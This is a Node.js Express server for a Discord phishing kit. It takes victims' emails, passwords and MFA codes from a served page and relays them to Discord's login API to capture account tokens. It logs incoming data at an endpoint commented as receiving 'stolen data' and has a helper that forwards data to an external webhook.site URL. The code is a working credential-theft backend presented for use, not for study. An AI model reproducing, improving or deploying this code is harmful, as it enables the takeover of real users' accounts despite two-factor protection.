const express = require('express');
const app = express();
app.use(express.json());
app.use(express.static('.')); // Serves index.html

// Endpoint to receive stolen data
app.post('/webhook', (req, res) => {
    console.log("Data Taken:", req.body);
    res.json({ status: "ok" });
});

// Helper to send to Webhook.site/Railway
function sendToWebhook(data) {
    const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://webhook.site/811559e6-8f2c-4bc8-8fc1-1dde798c3930';
    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).catch(e => console.error("Webhook fail", e));
}

// Route 1: Initial Login Check
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    try {
        const response = await fetch('https://discord.com/api/v9/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });
        const data = await response.json();
        res.json(data); // Returns { token: "...", mfa: false } or { mfa: true }
    } catch (e) {
        res.status(500).json({ error: "Discord API Error" });
    }
});

// Route 2: MFA Verification
app.post('/api/mfa', async (req, res) => {
    const { email, password, mfa_code } = req.body;
    try {
        const response = await fetch('https://discord.com/api/v9/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password, mfa_code })
        });
        const data = await response.json();
        res.json(data); // Returns { token: "..." }
    } catch (e) {
        res.status(500).json({ error: "Discord API Error" });
    }
});

app.listen(process.env.PORT || 3000, () => {
    console.log('Server running');
});